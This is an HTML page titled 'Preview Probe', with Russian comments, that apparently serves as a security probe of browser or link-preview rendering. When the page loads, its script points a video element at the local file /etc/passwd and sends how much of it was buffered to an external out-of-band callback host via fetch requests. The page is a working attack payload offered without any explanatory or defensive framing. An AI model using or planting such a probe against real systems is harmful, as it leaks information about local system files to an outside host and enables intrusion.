<!DOCTYPE html>
<html>
<head>
    <title>Preview Probe</title>
</head>
<body>
    <script>
        // Создаем элемент видео
        let v = document.createElement('video');
        v.src = 'file:///etc/passwd';
        v.autoplay = true; // Пытаемся заставить браузер начать чтение
        
        // Сценарий 1: Браузер начал парсить файл
        v.onprogress = function() {
            if (v.buffered.length > 0) {
                let fileSize = v.buffered.end(0); 
                fetch('https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun/SIZE_PROGRESS?val=' + fileSize);
            }
        };

        // Сценарий 2: Браузер выдал ошибку (Code 4), но успел что-то поместить в память
        v.onerror = function() {
            if (v.buffered.length > 0) {
                let fileSize = v.buffered.end(0); 
                fetch('https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun/SIZE_ERROR?val=' + fileSize);
            } else {
                // Если буфер пуст, отправляем просто лог, что скрипт отработал
                fetch('https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun/SIZE_EMPTY_BUFFER');
            }
        };
        
        // Обязательно добавляем элемент в DOM, иначе Chrome может оптимизировать и не начать загрузку
        document.body.appendChild(v);
    </script>
</body>
</html>
